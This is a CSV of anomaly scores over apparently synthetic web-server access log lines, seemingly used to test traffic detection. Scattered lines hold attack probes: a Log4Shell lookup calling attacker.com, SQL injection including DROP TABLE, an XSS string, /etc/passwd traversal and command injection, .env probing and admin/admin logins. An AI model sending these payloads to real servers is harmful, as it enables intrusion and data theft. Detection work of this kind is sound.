score_content,score_session,score_fused,score_fused_norm,line
2.0458433628082275,,2.0458433628082275,2.0458433628082275,137.2.161.17 - - [10/Jan/2025:12:14:15 +0000] "GET /contact HTTP/1.1" 200 17728 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.0368757247924805,,2.0368757247924805,2.0368757247924805,166.210.241.19 - - [10/Jan/2025:12:14:20 +0000] "GET /contact HTTP/1.1" 200 14361 "https://www.google.com/" "sqlmap/1.5.10#stable"
1.9347862005233765,,1.9347862005233765,1.9347862005233765,14.46.204.65 - - [10/Jan/2025:12:14:20 +0000] "GET /dashboard HTTP/1.1" 200 2500 "-" "python-requests/2.31.0"
2.1124520301818848,,2.1124520301818848,2.1124520301818848,162.104.111.81 - - [10/Jan/2025:12:14:24 +0000] "GET /login HTTP/1.1" 200 14882 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.0745646953582764,,2.0745646953582764,2.0745646953582764,194.191.150.12 - - [10/Jan/2025:12:14:29 +0000] "GET /admin HTTP/1.1" 201 2172 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.39753532409668,,24.39753532409668,24.39753532409668,196.238.113.98 - - [10/Jan/2025:12:14:33 +0000] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 9324 "-" "dirb/2.22"
24.408567428588867,,24.408567428588867,24.408567428588867,204.205.218.140 - - [10/Jan/2025:12:14:36 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12912 "https://www.google.com/" "curl/7.68.0"
30143.013671875,,30143.013671875,30143.013671875,142.224.143.37 - - [10/Jan/2025:12:14:38 +0000] "GET /profile HTTP/1.1" 429 22 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.327470779418945,,24.327470779418945,24.327470779418945,79.54.192.190 - - [10/Jan/2025:12:14:38 +0000] "GET /search?q=laptop HTTP/1.1" 200 2889 "https://example.com/" "sqlmap/1.5.10#stable"
0.20729440450668335,,0.20729440450668335,0.20729440450668335,158.214.65.50 - - [10/Jan/2025:12:14:39 +0000] "GET /assets/app.css HTTP/1.1" 200 7334 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30139.845703125,,30139.845703125,30139.845703125,119.166.141.19 - - [10/Jan/2025:12:14:44 +0000] "GET /index.html HTTP/1.1" 401 1124 "-" "curl/7.68.0"
30165.337890625,,30165.337890625,30165.337890625,33.172.168.61 - - [10/Jan/2025:12:14:46 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 429 731 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.221458435058594,,24.221458435058594,24.221458435058594,85.158.169.79 - - [10/Jan/2025:12:14:50 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 14866 "https://twitter.com/" "curl/7.68.0"
30142.73828125,,30142.73828125,30142.73828125,2.81.64.202 - - [10/Jan/2025:12:14:54 +0000] "GET /dashboard HTTP/1.1" 429 345 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.074826717376709,,3.074826717376709,3.074826717376709,225.123.119.115 - - [10/Jan/2025:12:14:56 +0000] "GET /assets/app.css HTTP/1.1" 301 10964 "https://example.com/" "curl/7.68.0"
0.21197447180747986,,0.21197447180747986,0.21197447180747986,216.72.220.212 - - [10/Jan/2025:12:14:59 +0000] "GET /assets/app.js HTTP/1.1" 204 2786 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.970676898956299,,4.970676898956299,4.970676898956299,218.130.162.8 - - [10/Jan/2025:12:15:00 +0000] "GET /about HTTP/1.1" 302 710 "https://twitter.com/" "python-requests/2.31.0"
30141.5703125,,30141.5703125,30141.5703125,67.140.229.139 - - [10/Jan/2025:12:15:03 +0000] "GET /api/products HTTP/1.1" 403 1129 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
2.0789482593536377,,2.0789482593536377,2.0789482593536377,131.24.102.94 - - [10/Jan/2025:12:15:05 +0000] "GET /logout HTTP/1.1" 200 16520 "-" "python-requests/2.31.0"
3.0985612869262695,,3.0985612869262695,3.0985612869262695,115.41.46.145 - - [10/Jan/2025:12:15:10 +0000] "GET /assets/app.js HTTP/1.1" 302 4699 "https://www.google.com/" "python-requests/2.31.0"
2.0415587425231934,,2.0415587425231934,2.0415587425231934,60.17.68.95 - - [10/Jan/2025:12:15:15 +0000] "GET /profile HTTP/1.1" 200 16079 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.0386366844177246,,2.0386366844177246,2.0386366844177246,226.12.11.252 - - [10/Jan/2025:12:15:20 +0000] "GET /profile HTTP/1.1" 200 14997 "https://example.com/" "sqlmap/1.5.10#stable"
30141.587890625,,30141.587890625,30141.587890625,149.140.146.45 - - [10/Jan/2025:12:15:20 +0000] "GET /login HTTP/1.1" 400 539 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
2.105457067489624,,2.105457067489624,2.105457067489624,250.233.58.133 - - [10/Jan/2025:12:15:22 +0000] "GET /about HTTP/1.1" 200 12431 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
30164.173828125,,30164.173828125,30164.173828125,129.226.36.113 - - [10/Jan/2025:12:15:24 +0000] "GET /search?q=headphones HTTP/1.1" 403 13 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.0855672359466553,,2.0855672359466553,2.0855672359466553,41.93.155.184 - - [10/Jan/2025:12:15:24 +0000] "GET /login HTTP/1.1" 200 6224 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.0407843589782715,,2.0407843589782715,2.0407843589782715,123.54.152.42 - - [10/Jan/2025:12:15:27 +0000] "GET /contact HTTP/1.1" 200 15789 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.20080432295799255,,0.20080432295799255,0.20080432295799255,35.162.132.11 - - [10/Jan/2025:12:15:27 +0000] "GET /assets/app.css HTTP/1.1" 200 5379 "https://www.google.com/" "python-requests/2.31.0"
0.2507002651691437,,0.2507002651691437,0.2507002651691437,154.249.145.164 - - [10/Jan/2025:12:15:27 +0000] "GET /assets/app.js HTTP/1.1" 200 13385 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30163.826171875,,30163.826171875,30163.826171875,57.213.106.154 - - [10/Jan/2025:12:15:27 +0000] "GET /search?q=headphones HTTP/1.1" 401 349 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.102139949798584,,2.102139949798584,2.102139949798584,237.117.153.152 - - [10/Jan/2025:12:15:28 +0000] "GET /login HTTP/1.1" 200 11328 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.044564962387085,,2.044564962387085,2.044564962387085,221.233.130.176 - - [10/Jan/2025:12:15:31 +0000] "GET /contact HTTP/1.1" 200 17228 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
30164.17578125,,30164.17578125,30164.17578125,10.225.201.137 - - [10/Jan/2025:12:15:35 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 403 1228 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30141.904296875,,30141.904296875,30141.904296875,167.111.134.108 - - [10/Jan/2025:12:15:38 +0000] "GET / HTTP/1.1" 403 1389 "-" "curl/7.68.0"
30164.0390625,,30164.0390625,30164.0390625,203.197.98.90 - - [10/Jan/2025:12:15:43 +0000] "GET /api/product?id=123 HTTP/1.1" 404 987 "https://twitter.com/" "python-requests/2.31.0"
2.0905628204345703,,2.0905628204345703,2.0905628204345703,233.220.22.73 - - [10/Jan/2025:12:15:43 +0000] "GET /login HTTP/1.1" 200 7718 "https://twitter.com/" "python-requests/2.31.0"
5.214468955993652,,5.214468955993652,5.214468955993652,148.134.31.134 - - [10/Jan/2025:12:15:46 +0000] "GET / HTTP/1.1" 302 333 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9361497163772583,,1.9361497163772583,1.9361497163772583,40.110.167.150 - - [10/Jan/2025:12:15:51 +0000] "GET /dashboard HTTP/1.1" 200 3592 "https://example.com/" "curl/7.68.0"
2.0333523750305176,,2.0333523750305176,2.0333523750305176,194.53.106.142 - - [10/Jan/2025:12:15:55 +0000] "GET /profile HTTP/1.1" 200 13123 "https://news.ycombinator.com/" "python-requests/2.31.0"
24.27521514892578,,24.27521514892578,24.27521514892578,148.89.199.181 - - [10/Jan/2025:12:15:56 +0000] "GET /search?q=headphones HTTP/1.1" 200 10148 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
24.204675674438477,,24.204675674438477,24.204675674438477,26.55.131.103 - - [10/Jan/2025:12:16:01 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 5401 "https://twitter.com/" "sqlmap/1.5.10#stable"
0.35994505882263184,,0.35994505882263184,0.35994505882263184,206.24.211.38 - - [10/Jan/2025:12:16:05 +0000] "GET /index.html HTTP/1.1" 200 273 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
24.520061492919922,,24.520061492919922,24.520061492919922,156.10.186.99 - - [10/Jan/2025:12:16:08 +0000] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 2722 "https://twitter.com/" "dirb/2.22"
30141.1171875,,30141.1171875,30141.1171875,164.127.113.3 - - [10/Jan/2025:12:16:13 +0000] "GET /index.html HTTP/1.1" 429 358 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.381446838378906,,24.381446838378906,24.381446838378906,93.62.168.1 - - [10/Jan/2025:12:16:15 +0000] "GET /api/product?id=123 HTTP/1.1" 201 1281 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.8899006843566895,,4.8899006843566895,4.8899006843566895,151.52.133.4 - - [10/Jan/2025:12:16:17 +0000] "GET /profile HTTP/1.1" 301 13385 "-" "sqlmap/1.5.10#stable"
2.021177053451538,,2.021177053451538,2.021177053451538,58.156.247.50 - - [10/Jan/2025:12:16:17 +0000] "GET /profile HTTP/1.1" 200 9160 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
0.060689087957143784,,0.060689087957143784,0.060689087957143784,144.19.129.76 - - [10/Jan/2025:12:16:21 +0000] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 3588 "-" "sqlmap/1.5.10#stable"
4.961323261260986,,4.961323261260986,4.961323261260986,145.124.198.63 - - [10/Jan/2025:12:16:25 +0000] "GET /login HTTP/1.1" 301 12456 "https://news.ycombinator.com/" "curl/7.68.0"
2.30808424949646,,2.30808424949646,2.30808424949646,18.98.163.202 - - [10/Jan/2025:12:16:30 +0000] "GET / HTTP/1.1" 200 8548 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.040022611618042,,2.040022611618042,2.040022611618042,180.214.68.64 - - [10/Jan/2025:12:16:32 +0000] "GET /profile HTTP/1.1" 200 418 "-" "curl/7.68.0"
1.9431190490722656,,1.9431190490722656,1.9431190490722656,122.81.91.56 - - [10/Jan/2025:12:16:35 +0000] "GET /dashboard HTTP/1.1" 200 5948 "https://example.com/" "python-requests/2.31.0"
1.9658671617507935,,1.9658671617507935,1.9658671617507935,61.189.62.224 - - [10/Jan/2025:12:16:36 +0000] "GET /api/products HTTP/1.1" 200 6642 "https://www.google.com/" "curl/7.68.0"
30163.8828125,,30163.8828125,30163.8828125,40.200.28.31 - - [10/Jan/2025:12:16:37 +0000] "GET /api/product?id=123 HTTP/1.1" 400 729 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30139.798828125,,30139.798828125,30139.798828125,159.81.127.230 - - [10/Jan/2025:12:16:41 +0000] "GET /wp-login.php HTTP/1.1" 401 760 "https://news.ycombinator.com/" "python-requests/2.31.0"
2.1231400966644287,,2.1231400966644287,2.1231400966644287,33.14.135.205 - - [10/Jan/2025:12:16:42 +0000] "GET /login HTTP/1.1" 200 18996 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
24.308753967285156,,24.308753967285156,24.308753967285156,118.250.31.179 - - [10/Jan/2025:12:16:46 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 5827 "https://example.com/" "nikto/2.5.0"
24.18633270263672,,24.18633270263672,24.18633270263672,84.93.157.221 - - [10/Jan/2025:12:16:51 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 3401 "https://www.google.com/" "python-requests/2.31.0"
2.102182626724243,,2.102182626724243,2.102182626724243,94.48.128.109 - - [10/Jan/2025:12:16:55 +0000] "GET /login HTTP/1.1" 200 11342 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30141.5546875,,30141.5546875,30141.5546875,116.47.147.34 - - [10/Jan/2025:12:17:00 +0000] "GET /profile HTTP/1.1" 401 572 "https://www.google.com/" "python-requests/2.31.0"
24.4075927734375,,24.4075927734375,24.4075927734375,51.38.205.246 - - [10/Jan/2025:12:17:00 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12580 "https://www.google.com/" "sqlmap/1.5.10#stable"
0.2225443720817566,,0.2225443720817566,0.2225443720817566,229.218.162.133 - - [10/Jan/2025:12:17:03 +0000] "GET /assets/app.js HTTP/1.1" 200 4506 "https://example.com/" "python-requests/2.31.0"
0.3089209198951721,,0.3089209198951721,0.3089209198951721,16.56.209.66 - - [10/Jan/2025:12:17:06 +0000] "GET /index.html HTTP/1.1" 200 5452 "-" "Wget/1.20.3 (linux-gnu)"
2.1218178272247314,,2.1218178272247314,2.1218178272247314,143.239.208.66 - - [10/Jan/2025:12:17:09 +0000] "GET /login HTTP/1.1" 200 18461 "-" "curl/7.68.0"
24.229063034057617,,24.229063034057617,24.229063034057617,45.251.200.73 - - [10/Jan/2025:12:17:12 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 17743 "https://example.com/" "sqlmap/1.5.10#stable"
30163.955078125,,30163.955078125,30163.955078125,158.74.119.162 - - [10/Jan/2025:12:17:17 +0000] "GET /search?q=camera HTTP/1.1" 403 780 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.981202244758606,,1.981202244758606,1.981202244758606,104.218.233.19 - - [10/Jan/2025:12:17:22 +0000] "GET /dashboard HTTP/1.1" 200 18831 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9459209442138672,,1.9459209442138672,1.9459209442138672,155.166.102.70 - - [10/Jan/2025:12:17:24 +0000] "GET /dashboard HTTP/1.1" 204 8864 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
24.336212158203125,,24.336212158203125,24.336212158203125,219.6.33.187 - - [10/Jan/2025:12:17:29 +0000] "GET /search?q=camera HTTP/1.1" 200 6125 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.1074459552764893,,2.1074459552764893,2.1074459552764893,27.25.17.240 - - [10/Jan/2025:12:17:34 +0000] "GET /about HTTP/1.1" 200 13110 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
0.5146324634552002,,0.5146324634552002,0.5146324634552002,27.68.159.40 - - [10/Jan/2025:12:17:34 +0000] "GET /.env HTTP/1.1" 200 2827 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.0414209365844727,,2.0414209365844727,2.0414209365844727,34.135.215.44 - - [10/Jan/2025:12:17:36 +0000] "GET /logout HTTP/1.1" 200 4242 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30141.474609375,,30141.474609375,30141.474609375,250.223.139.240 - - [10/Jan/2025:12:17:41 +0000] "GET /dashboard HTTP/1.1" 401 956 "https://twitter.com/" "curl/7.68.0"
0.09595653414726257,,0.09595653414726257,0.09595653414726257,162.192.163.225 - - [10/Jan/2025:12:17:44 +0000] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 15060 "https://twitter.com/" "dirb/2.22"
30141.69921875,,30141.69921875,30141.69921875,139.59.207.23 - - [10/Jan/2025:12:17:49 +0000] "GET /logout HTTP/1.1" 404 986 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
0.313111811876297,,0.313111811876297,0.313111811876297,134.209.195.218 - - [10/Jan/2025:12:17:51 +0000] "GET /assets/app.css HTTP/1.1" 200 103 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.18662691116333,,5.18662691116333,5.18662691116333,243.194.123.77 - - [10/Jan/2025:12:17:53 +0000] "GET / HTTP/1.1" 301 16219 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.3005239963531494,,2.3005239963531494,2.3005239963531494,106.226.144.112 - - [10/Jan/2025:12:17:55 +0000] "GET / HTTP/1.1" 200 6279 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
30163.849609375,,30163.849609375,30163.849609375,68.21.109.161 - - [10/Jan/2025:12:17:56 +0000] "GET /search?q=laptop HTTP/1.1" 400 451 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.1194705963134766,,2.1194705963134766,2.1194705963134766,208.69.106.49 - - [10/Jan/2025:12:18:00 +0000] "GET /login HTTP/1.1" 200 17530 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.343772888183594,,24.343772888183594,24.343772888183594,180.160.126.49 - - [10/Jan/2025:12:18:01 +0000] "GET /search?q=camera HTTP/1.1" 201 9017 "-" "curl/7.68.0"
2.0773816108703613,,2.0773816108703613,2.0773816108703613,73.69.33.184 - - [10/Jan/2025:12:18:02 +0000] "GET /admin HTTP/1.1" 200 3451 "-" "nikto/2.5.0"
2.1020634174346924,,2.1020634174346924,2.1020634174346924,108.80.202.205 - - [10/Jan/2025:12:18:03 +0000] "GET /admin HTTP/1.1" 200 11303 "https://example.com/" "nikto/2.5.0"
0.3071288764476776,,0.3071288764476776,0.3071288764476776,15.69.199.101 - - [10/Jan/2025:12:18:06 +0000] "GET /index.html HTTP/1.1" 200 4887 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30141.80078125,,30141.80078125,30141.80078125,32.250.197.183 - - [10/Jan/2025:12:18:09 +0000] "GET /login HTTP/1.1" 400 25 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.30277490615844727,,0.30277490615844727,0.30277490615844727,134.171.252.54 - - [10/Jan/2025:12:18:12 +0000] "GET /index.html HTTP/1.1" 200 3178 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
1.9381871223449707,,1.9381871223449707,1.9381871223449707,191.240.141.134 - - [10/Jan/2025:12:18:17 +0000] "GET /dashboard HTTP/1.1" 200 1482 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9565918445587158,,1.9565918445587158,1.9565918445587158,222.171.56.250 - - [10/Jan/2025:12:18:20 +0000] "GET /api/products HTTP/1.1" 200 1806 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.310039758682251,,2.310039758682251,2.310039758682251,150.31.102.203 - - [10/Jan/2025:12:18:25 +0000] "GET / HTTP/1.1" 200 9147 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.114683151245117,,27.114683151245117,27.114683151245117,96.198.23.64 - - [10/Jan/2025:12:18:25 +0000] "GET /search?q=headphones HTTP/1.1" 301 5178 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30141.59375,,30141.59375,30141.59375,16.16.92.166 - - [10/Jan/2025:12:18:25 +0000] "GET /dashboard HTTP/1.1" 404 1280 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.24346923828125,,24.24346923828125,24.24346923828125,202.166.194.89 - - [10/Jan/2025:12:18:25 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 18396 "https://www.google.com/" "nikto/2.5.0"
4.893850326538086,,4.893850326538086,4.893850326538086,231.11.125.181 - - [10/Jan/2025:12:18:25 +0000] "GET /profile HTTP/1.1" 302 8314 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
24.262279510498047,,24.262279510498047,24.262279510498047,140.90.83.188 - - [10/Jan/2025:12:18:27 +0000] "GET /search?q=headphones HTTP/1.1" 200 6215 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
0.22461046278476715,,0.22461046278476715,0.22461046278476715,116.76.210.68 - - [10/Jan/2025:12:18:31 +0000] "GET /assets/app.js HTTP/1.1" 200 5179 "https://example.com/" "python-requests/2.31.0"
3.408745050430298,,3.408745050430298,3.408745050430298,159.220.94.199 - - [10/Jan/2025:12:18:34 +0000] "GET /.env HTTP/1.1" 302 713 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
0.5547404885292053,,0.5547404885292053,0.5547404885292053,197.142.40.157 - - [10/Jan/2025:12:18:39 +0000] "GET /.env HTTP/1.1" 200 16403 "https://example.com/" "python-requests/2.31.0"
2.002321481704712,,2.002321481704712,2.002321481704712,12.214.241.34 - - [10/Jan/2025:12:18:42 +0000] "GET /contact HTTP/1.1" 200 2284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.231731414794922,,24.231731414794922,24.231731414794922,165.215.100.169 - - [10/Jan/2025:12:18:43 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 18810 "https://twitter.com/" "nikto/2.5.0"
2.0892739295959473,,2.0892739295959473,2.0892739295959473,156.184.19.4 - - [10/Jan/2025:12:18:47 +0000] "GET /login HTTP/1.1" 200 7332 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.33511900901794434,,0.33511900901794434,0.33511900901794434,211.95.204.182 - - [10/Jan/2025:12:18:47 +0000] "GET /index.html HTTP/1.1" 200 13729 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30141.6484375,,30141.6484375,30141.6484375,242.56.246.133 - - [10/Jan/2025:12:18:49 +0000] "GET /about HTTP/1.1" 400 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.369962692260742,,24.369962692260742,24.369962692260742,169.64.146.161 - - [10/Jan/2025:12:18:54 +0000] "GET /search?q=laptop HTTP/1.1" 200 17342 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.96438455581665,,4.96438455581665,4.96438455581665,92.173.118.180 - - [10/Jan/2025:12:18:59 +0000] "GET /contact HTTP/1.1" 304 18992 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.25962212681770325,,0.25962212681770325,0.25962212681770325,87.169.41.137 - - [10/Jan/2025:12:18:59 +0000] "GET /assets/app.js HTTP/1.1" 200 16637 "https://news.ycombinator.com/" "python-requests/2.31.0"
30141.4375,,30141.4375,30141.4375,196.163.111.212 - - [10/Jan/2025:12:19:01 +0000] "GET /dashboard HTTP/1.1" 400 844 "https://example.com/" "sqlmap/1.5.10#stable"
1.9998939037322998,,1.9998939037322998,1.9998939037322998,238.191.66.93 - - [10/Jan/2025:12:19:05 +0000] "GET /api/products HTTP/1.1" 200 18130 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
11029.8505859375,,11029.8505859375,11029.8505859375,5.133.35.228 - - [10/Jan/2025:12:19:08 +0000] "GET /wp-login.php HTTP/1.1" 502 1220 "-" "python-requests/2.31.0"
30141.66796875,,30141.66796875,30141.66796875,198.211.242.177 - - [10/Jan/2025:12:19:10 +0000] "GET /api/products HTTP/1.1" 401 44 "https://twitter.com/" "curl/7.68.0"
0.23129592835903168,,0.23129592835903168,0.23129592835903168,92.40.36.68 - - [10/Jan/2025:12:19:14 +0000] "GET /assets/app.css HTTP/1.1" 200 15185 "https://twitter.com/" "curl/7.68.0"
2.0697996616363525,,2.0697996616363525,2.0697996616363525,146.235.56.188 - - [10/Jan/2025:12:19:15 +0000] "GET /logout HTTP/1.1" 200 13200 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.023690700531006,,2.023690700531006,2.023690700531006,10.188.207.148 - - [10/Jan/2025:12:19:18 +0000] "GET /contact HTTP/1.1" 200 9943 "-" "Wget/1.20.3 (linux-gnu)"
1.9693909883499146,,1.9693909883499146,1.9693909883499146,107.239.223.31 - - [10/Jan/2025:12:19:18 +0000] "GET /dashboard HTTP/1.1" 200 14331 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
